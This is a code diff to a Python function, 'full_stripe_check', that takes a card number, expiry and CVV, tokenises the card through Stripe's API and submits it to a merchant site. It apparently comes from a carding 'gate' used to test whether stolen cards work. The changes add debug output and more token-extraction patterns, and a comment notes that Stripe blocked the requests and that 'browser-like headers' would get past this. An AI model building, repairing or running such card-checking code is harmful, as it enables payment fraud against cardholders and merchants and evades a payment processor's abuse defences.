@@ -41,7 +41,7 @@ def full_stripe_check(cc, mm, yy, cvv):
             return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
         ajax_nonce = payment_nonce_match.group(1)
 
-        # Step 5: Get Stripe payment token - SIMPLE APPROACH
+        # Step 5: Get Stripe payment token
         stripe_data = {
             'type': 'card',
             'card[number]': cc,
@@ -53,24 +53,50 @@ def full_stripe_check(cc, mm, yy, cvv):
         
         stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
         
-        # Extract payment token using regex to find pm_ ID
-        response_text = stripe_response.text
-        payment_token_match = re.search(r'"id":\s*"(pm_[^"]+)"', response_text)
+        # DEBUG: Print the actual response
+        print(f"Stripe Status: {stripe_response.status_code}")
+        print(f"Stripe Headers: {dict(stripe_response.headers)}")
+        print(f"Stripe Response Text: {stripe_response.text}")
         
-        if payment_token_match:
-            payment_token = payment_token_match.group(1)
+        # Check if we got the integration error
+        if "integration surface is unsupported" in stripe_response.text:
+            # Try alternative approach - use the exact same request as in gate.py
+            return {"status": "Declined", "response": "Stripe blocked the request. Need to use browser-like headers.", "decline_type": "process_error"}
+        
+        # Extract payment token
+        response_text = stripe_response.text
+        
+        # Try multiple regex patterns to find the payment token
+        patterns = [
+            r'"id":\s*"(pm_[^"]+)"',
+            r'id":\s*"(pm_[^"]+)"',
+            r'pm_[a-zA-Z0-9_]+',
+            r'"payment_method":\s*"(pm_[^"]+)"'
+        ]
+        
+        payment_token = None
+        for pattern in patterns:
+            match = re.search(pattern, response_text)
+            if match:
+                if pattern == r'pm_[a-zA-Z0-9_]+':
+                    payment_token = match.group(0)
+                else:
+                    payment_token = match.group(1)
+                break
+        
+        if payment_token and payment_token.startswith('pm_'):
             print(f"Successfully extracted payment token: {payment_token}")
         else:
-            # If regex fails, try to parse JSON
+            # Try JSON parsing as fallback
             try:
                 stripe_json = stripe_response.json()
                 payment_token = stripe_json.get('id')
                 if payment_token and payment_token.startswith('pm_'):
                     print(f"Successfully extracted payment token from JSON: {payment_token}")
                 else:
-                    return {"status": "Declined", "response": "No valid payment token found in response", "decline_type": "process_error"}
+                    return {"status": "Declined", "response": f"No valid payment token found. Response: {response_text[:200]}", "decline_type": "process_error"}
             except:
-                return {"status": "Declined", "response": "Failed to parse Stripe response", "decline_type": "process_error"}
+                return {"status": "Declined", "response": f"Failed to parse response: {response_text[:200]}", "decline_type": "process_error"}
 
         # Step 6: Submit to website
         site_data = {
